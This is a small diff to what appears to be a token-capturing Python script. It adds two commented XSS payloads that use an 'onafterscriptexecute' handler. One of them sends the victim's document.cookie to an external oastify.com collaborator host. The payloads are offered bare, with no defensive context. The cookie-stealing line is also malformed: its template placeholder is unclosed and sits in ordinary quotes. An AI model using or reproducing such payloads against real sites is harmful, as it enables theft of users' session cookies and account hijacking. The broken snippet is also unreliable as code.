@@ -102,3 +102,5 @@ if __name__ == "__main__":
             print("没有成功捕获token，请排除错误")
 
         
+# xss <code onafterscriptexecute=alert(1)><script>1</script>
+# <code onafterscriptexecute=alert(1)><script>document.location="http://Yvnmd2x97pmyx8ictgoq94vrm6dc40uoj.oastify.com/${encodeURIComponent(document.cookie)"</script>
